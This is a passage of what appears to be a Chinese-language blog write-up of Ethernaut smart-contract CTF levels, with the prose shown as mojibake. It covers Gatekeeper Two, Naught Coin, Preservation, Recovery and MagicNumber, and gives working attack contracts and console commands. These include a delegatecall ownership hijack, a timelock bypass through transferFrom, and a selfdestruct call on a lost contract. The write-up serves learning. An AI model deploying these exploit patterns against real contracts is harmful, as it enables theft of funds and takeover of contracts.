<p>ä½†æ˜¯ç¬¬äºŒä¸ªæ¡ä»¶åˆè¦è¦æ±‚è°ƒç”¨è€…çš„åœ°å€ä¸Šä¸èƒ½æ²¡æœ‰ä»£ç ï¼Œå³è²Œä¼¼è°ƒç”¨è€…å¿…é¡»æ˜¯ä¸€ä¸ªå¤–éƒ¨è´¦æˆ·ï¼ˆEOAï¼‰ï¼Ÿå…¶å®ä¸ç„¶ï¼Œå¦‚æœä¸€ä¸ªåˆçº¦ï¼Œåœ¨æ„é€ å‡½æ•°è¿è¡Œé˜¶æ®µï¼Œå¯¹è¯¥åœ°å€è°ƒç”¨<code>extcodesize</code>ï¼Œåˆ™è¿”å›çš„æ˜¯é›¶ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸€ç‚¹å³å¯ã€‚</p>
<p>å¯¹äºç¬¬ä¸‰ä¸ªï¼Œå…ˆæ˜¯å¯¹æˆ‘ä»¬çš„è°ƒç”¨æ–¹çš„åœ°å€è¿›è¡Œæ‰“åŒ…ï¼Œåˆè¿›è¡Œè®¡ç®—å“ˆå¸Œï¼Œåˆæ˜¯è½¬æ•°ç»„ï¼Œåˆæ˜¯è½¬64ä½æ— ç¬¦å·æ•´æ•°çš„ï¼Œæœ€åè¿˜è¦å’Œä¸€ä¸ªæ•°å­—å¼‚æˆ–ï¼Œçœ‹ä¼¼å¾ˆå¤æ‚ï¼Œå…¶å®ï¼Œæˆ‘ä»¬å¯ç”¨ä½¿ç”¨å¼‚æˆ–çš„é€†æ“ä½œï¼Œå³ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x ^ y &#x3D; z</span><br><span class="line">åˆ™ x &#x3D; y ^ z</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆï¼Œæ”»å‡»çš„åˆçº¦å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">     constructor()  &#123;</span><br><span class="line">        &#x2F;&#x2F; 	è¯¥åœ°å€å¯ä»¥åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ &#96;instance&#96; è·å–</span><br><span class="line">        address _addr &#x3D; 0x0aD80881e0C2b8294beA62b5916Bb0029b93922e;</span><br><span class="line">        bytes8 _gateKey &#x3D; bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));</span><br><span class="line">    	_addr.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&#39;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šå°†æ‚¨çš„ä»£å¸ä½™é¢å˜æˆé›¶ã€‚</p>
<p>ä¹ä¸€çœ‹ä¸Šå»ï¼Œç”±äºåå¹´æœŸé™çš„é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨<code>transfer</code>è¿›è¡Œè½¬è´¦ï¼Œä½†æ˜¯å®é™…ä¸Šè¯¥ä»£å¸æ˜¯<code>ERC20</code>ä»£å¸çš„å®ç°ï¼Œè¯¥ä»£å¸æ¥å£ä¸­æœ‰ä¸€ä¸ªæˆæƒè½¬è´¦çš„å‡½æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender &#x3D; _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance &#x3D; allowance(owner, spender);</span><br><span class="line">        if (currentAllowance !&#x3D; type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;&#x3D; amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä½¿ç”¨è¯¥å‡½æ•°æœ‰ä¸ªå‰ææ¡ä»¶ï¼Œå³<code>msg.sender</code>è¦è·å¾—<code>from</code>çš„æˆæƒï¼Œæˆæƒä»£å¸é¢åº¦å¤§äºç­‰äº<code>amount</code>ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬è¦ç»™è‡ªå·±æˆæƒï¼Œè¯¥å‡½æ•°å®ç°å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner &#x3D; _msgSender();</span><br><span class="line">        _approve(owner, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>spender</code>æ˜¯è¢«æˆæƒæ–¹ã€‚</p>
<p>å› æ­¤ä¾æ¬¡åœ¨æ§åˆ¶å°è¾“å…¥å¦‚ä¸‹å³å¯ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="string">'1000000000000000000000000'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">'0x34a2Bdc713002B5b7c80F20233b306977aD3B64E'</span>,<span class="string">'1000000000000000000000000'</span>)</span><br></pre></td></tr></table></figure>

<p><code>0x34a2Bdc713002B5b7c80F20233b306977aD3B64E</code>æ˜¯ä¸€ä¸ªåˆæ³•çš„ç¬¬ä¸‰æ–¹è´¦æˆ·ã€‚</p>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šè·å¾—åˆçº¦æ‰€æœ‰æƒã€‚</p>
<p>æˆ‘ä»¬å…ˆæ¥å›é¡¾ä¸€ä¸‹<code>delegatecall</code>çš„ç”¨æ³•</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>å®é™…ä¸Šï¼Œä½ å¯ä»¥ç²—ç•¥åœ°ç†è§£æˆæˆ‘ä»¬æŠŠç›®æ ‡åˆçº¦çš„å‡½æ•°ä»£ç ç»™æ‹¿äº†è¿‡æ¥ï¼Œæ”¾åœ¨æˆ‘ä»¬å½“å‰åˆçº¦ä¸­æ‰§è¡Œï¼Œä¿®æ”¹çš„æ˜¯å½“å‰åˆçº¦çš„å˜é‡ï¼Œç›¸å½“äºå¼•å…¥åº“å‡½æ•°çš„åŠŸèƒ½ã€‚</p>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹<code>Preservation</code>åˆçº¦çš„å­˜å‚¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone1Library (20)| &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone2Library (20)| &lt;- slot 1</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) |       owner (20)     | &lt;- slot 2</span><br><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 3</span><br><span class="line">---------------------------------------</span><br><span class="line">|    unused (28) |setTimeSignature (4)| &lt;- slot 4</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹çœ‹<code>LibraryContract</code>åˆçº¦çš„å­˜å‚¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>ç”±äºå˜é‡<code>storedTime</code>åœ¨<code>LibraryContract</code>åˆçº¦ä¸­ï¼Œæ˜¯åœ¨<code>slot 0</code>çš„ä½ç½®ï¼Œå› æ­¤å½“<code>Preservation</code>è°ƒç”¨<code>setFirstTime</code>çš„æ—¶å€™ï¼Œç”±äº<code>delegatecall</code>çš„ç‰¹æ€§ï¼Œä¿®æ”¹çš„æ˜¯å…¶<code>slot 0</code>å¤„çš„å˜é‡ï¼Œå³å˜é‡<code>timeZone1Library</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯å°†å…¶è®¾ç½®ä¸ºä¸€ä¸ªæ¶æ„åœ°å€ï¼ŒæŒ‡å‘ä¸€ä¸ªæ¶æ„åˆçº¦ï¼Œç„¶åæ¶æ„ä¸­ä¿®æ”¹<code>owner</code>å˜é‡å³å¯ã€‚</p>
<p>æ”»å‡»åˆçº¦å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line"></span><br><span class="line">  address public foo1;</span><br><span class="line">  address public foo2;</span><br><span class="line">  address public storedTime; </span><br><span class="line"></span><br><span class="line"> function setTime(uint _time) public &#123;</span><br><span class="line"> &#x2F;&#x2F; storedTime æ˜¯åœ¨ slot 2 çš„ä½ç½®ï¼Œå› æ­¤å°†æ¥ä¿®æ”¹çš„æ˜¯ owner</span><br><span class="line">    storedTime &#x3D; address(uint160(_time));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å…ˆéƒ¨ç½²ä¸Šè¿°åˆçº¦ï¼Œè·å¾—å…¶åœ°å€<code>0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD</code>ï¼Œç„¶ååœ¨æ§åˆ¶å°è¾“å…¥ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">'0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD'</span>)</span><br></pre></td></tr></table></figure>

<p>å†è°ƒç”¨å‡½æ•°</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(player)</span><br></pre></td></tr></table></figure>

<p>å³å¯å®Œæˆä¿®æ”¹ã€‚</p>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šæ‰¾å›å·²éƒ¨ç½²çš„<code>SimpleToken</code>åˆçº¦ã€‚</p>
<p> è¯¥å…³å¡è€ƒå¯Ÿçš„åº”è¯¥æ˜¯å¦‚ä½•æ ¹æ®åˆçº¦åœ°å€å»è¿½è¸ªå†å²äº¤æ˜“ã€‚</p>
<p>æˆ‘ä»¬å…ˆåœ¨æ§åˆ¶å°è¾“å…¥<code>instance</code>ï¼Œè·å–å…³å¡å®ä¾‹åœ°å€ï¼Œæ³¨æ„ï¼Œè¿™ä¸æ˜¯åˆçº¦<code>SimpleToken</code>çš„åœ°å€ï¼Œå¾—åˆ°è¯¥å®åŠ›åœ°å€ä»¥åï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sepolia.etherscan.io&#x2F;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æˆ‘ç”¨çš„æ˜¯sepoliaæµ‹è¯•ç½‘ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯å…¶ä»–æµ‹è¯•ç½‘ï¼Œè¦ç›¸åº”åœ°ä¿®æ”¹åœ°å€</p>
</blockquote>
<p>è¾“å…¥å®åŠ›åœ°å€ï¼Œå¹¶é€‰æ‹©internal transactionï¼Œæ‰¾åˆ°æœ€æ–°çš„è®°å½•</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230304132643.png" alt></p>
<p>ç‚¹å‡»ã€Contract Creationã€‘ï¼Œè¿›å»åå¾—åˆ°ä¸€ä¸ªåœ°å€<code>0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f</code>ï¼Œè€Œä¸”è¯¥åœ°å€è´¦æˆ·æ‹¥æœ‰0.001etherï¼Œå®é™…ä¸Šè¯¥åœ°å€å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„åˆçº¦åœ°å€ï¼Œæˆ‘ä»¬åªè¦è°ƒç”¨è¯¥åœ°å€ä¸Šé¢çš„<code>destroy</code>å‡½æ•°å³å¯ï¼Œæˆ‘ä»¬å¯ç”¨é€šå…³éƒ¨ç½²ä¸€ä¸‹åˆçº¦è¿›è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract RecoveryAttack &#123;</span><br><span class="line">&#x2F;&#x2F; åœ¨æ§åˆ¶å°è¾“å…¥  player è·å¾—å¯¹åº”åœ°å€</span><br><span class="line">  constructor(address _player)&#123;</span><br><span class="line">  </span><br><span class="line">  	address(0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f).call(</span><br><span class="line">  		abi.encodeWithSignature(&quot;destroy(address)&quot;, _player)</span><br><span class="line">  	);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šéƒ¨ç½²ä¸€ä¸ªåˆçº¦</p>
<p>æˆ‘ä»¬éœ€è¦éƒ¨ç½²ä¸€ä¸ªåˆçº¦<code>Solver</code>ï¼Œè¯¥åˆçº¦ä¸­ä¼šè¿”å›ä¸€ä¸ªæ•°å­—ï¼Œå’Œ<code>whatIsTheMeaningOfLife()</code>å¯¹åº”ï¼Œå®é™…ä¸Šæ˜¯42ï¼ˆ<del>åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“ï¼Œé—®å°±æ˜¯ç½‘å‹è¯´çš„</del>ï¼‰.è¿˜è¦è¦æ±‚è¯¥åˆçº¦ä¸­çš„å­—èŠ‚ç ä¸è¶…è¿‡10ä¸ªã€‚</p>
<p>æœ¬å…³å¡å¥½éš¾ï¼Œç›´æ¥å»ç½‘ä¸Šçœ‹åˆ«äººçš„åšæ³•ï¼</p>
<blockquote>
<p>å‚è€ƒé“¾æ¥<a href="https://paper.seebug.org/790/" target="_blank" rel="noopener">ã€ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦é™æ€åˆ†æã€‘</a>ã€<a href="https://www.ethervm.io/" target="_blank" rel="noopener">ã€ethervm.ioã€‘</a>ã€<a href="https://xz.aliyun.com/t/11159#toc-9ã€‘" target="_blank" rel="noopener">https://xz.aliyun.com/t/11159#toc-9ã€‘</a></p>
</blockquote>
<p>æ™ºèƒ½åˆçº¦ç¼–è¯‘åçš„å­—èŠ‚ç ï¼Œåˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼šéƒ¨ç½²ä»£ç ã€runtimeä»£ç ã€auxdataã€‚</p>
<p>å½“ç„¶ï¼Œauxdataæ˜¯æºç çš„åŠ å¯†æŒ‡çº¹ï¼Œç”¨æ¥éªŒè¯ã€‚è¿™åªæ˜¯æ•°æ®ï¼Œæ°¸è¿œä¸ä¼šè¢«EVMæ‰§è¡Œã€‚</p>
<p>ä»¥å¤ªåŠè™šæ‹Ÿæœºåœ¨åˆ›å»ºåˆçº¦çš„æ—¶å€™ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ªåˆçº¦è´¦æˆ·ï¼Œç„¶åè¿è¡Œéƒ¨ç½²ä»£ç ã€‚è¿è¡Œå®Œæˆåå®ƒä¼šå°†<strong>runtimeä»£ç +auxdata å­˜å‚¨åˆ°åŒºå—é“¾ä¸Š</strong>ã€‚ä¹‹åå†æŠŠäºŒè€…çš„å­˜å‚¨åœ°å€è·Ÿåˆçº¦è´¦æˆ·å…³è”èµ·æ¥(ä¹Ÿå°±æ˜¯æŠŠåˆçº¦è´¦æˆ·ä¸­çš„code hashå­—æ®µç”¨è¯¥åœ°å€èµ‹å€¼)ï¼Œè¿™æ ·å°±å®Œæˆäº†åˆçº¦çš„éƒ¨ç½²ã€‚è€Œæˆ‘ä»¬æœ¬å…³å¡ä¸»è¦æ˜¯ä»runtimeä»£ç å…¥æ‰‹ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬è¦è¿”å›42ï¼Œåˆ™æœ€åçš„å­—èŠ‚ç å¿…é¡»æ˜¯<code>RETURN</code>ï¼Œä½¿ç”¨è¯¥å­—èŠ‚ç æ—¶å€™ï¼Œå°†ä¼šä¾æ¬¡ä»æ ˆä¸­å–ä¸¤ä¸ªå…ƒç´ ï¼Œä½œä¸ºåç§»é‡<code>offset</code>å’Œé•¿åº¦<code>length</code>ï¼Œæœ€ç»ˆè¿”å›çš„å†…å®¹æ˜¯<code>memory[offset:offset+length]</code>ï¼Œå› æ­¤æˆ‘ä»¬è¦åœ¨<code>RETURN</code>ä¸Šé¢å°†åç§»é‡å’Œé•¿åº¦å†™è¿›æ ˆä¸­ï¼Œç„¶ååœ¨æ­¤ä¹‹ä¸Šï¼Œå†å†™å…¥42åˆ°å†…å­˜<code>memory</code>ä¸­ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åç§»    æ±‡ç¼–æŒ‡ä»¤å¯¹åº”äºŒè¿›åˆ¶ï¼ˆ16è¿›åˆ¶ï¼‰å®é™…æ±‡ç¼–æŒ‡ä»¤</span><br><span class="line">0000    602a                 PUSH1 0x2a</span><br><span class="line">0002    6050                 PUSH1 0x50</span><br><span class="line">0004    52                   mstore</span><br><span class="line">0007    6020                 PUSH1 0x20</span><br><span class="line">0009    6050                 PUSH1 0x50</span><br><span class="line">000B    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>å‰ä¸‰è¡Œæ˜¯å†™å…¥42ï¼Œåä¸‰è¡Œæ˜¯è®¾ç½®<code>return</code>çš„å†…å®¹.è®¾ç½®åç§»é‡ä¸º<code>0x50</code>æ˜¯å› ä¸ºæˆ‘ä»¬çš„ä½éƒ¨åˆ†ä½ç½®æ”¾äº†ä»£ç ã€‚</p>
<p>ä¸Šè¿°çš„æ±‡ç¼–ä½œä¸º<code>runtime</code>ä»£ç ï¼Œåˆšå¥½10ä¸ªå­—èŠ‚ï¼Œå³10ä¸ª<code>opcode</code>ï¼ˆä»¥å¤ªåŠä¸­ï¼Œä¸€ä¸ªå­—èŠ‚ç å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼‰ã€‚</p>
<p>ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬è¦é€šè¿‡éƒ¨ç½²ä»£ç ï¼Œå°†<code>runtime</code>ä»£ç å†™å…¥åŒºå—é“¾ï¼›åœ¨éƒ¨ç½²ä»£ç è¿™ä¸€å—ï¼Œå†™å…¥ä»£ç éœ€è¦ä½¿ç”¨<code>CODECOPY</code>ï¼Œè¯¥æ“ä½œç ä¼šä¾æ¬¡ä»æ ˆä¸­å–å‡ºä¸‰ä¸ªæ“ä½œæ•°<code>destOffset</code>ã€<code>offset</code>ã€<code>length</code>ï¼Œå³å®Œæˆ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory[destOffset:destOffset+length] &#x3D; msg.data[offset:offset+length]</span><br></pre></td></tr></table></figure>

<p>å› æ­¤è¿™ä¸€æ®µçš„æ±‡ç¼–å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">åç§»    æ±‡ç¼–æŒ‡ä»¤å¯¹åº”äºŒè¿›åˆ¶ï¼ˆ16è¿›åˆ¶ï¼‰å®é™…æ±‡ç¼–æŒ‡ä»¤</span><br><span class="line">0000    600a            PUSH1 0x0a</span><br><span class="line">0002    600c            PUSH1 0x0c</span><br><span class="line">0004    6000            PUSH1 0x00</span><br><span class="line">0006    39              CODECOPY</span><br><span class="line">0007    600a            PUSH1 0x0a</span><br><span class="line">0009    6000            PUSH1 0x00</span><br><span class="line">000B    F3              RETURN</span><br></pre></td></tr></table></figure>

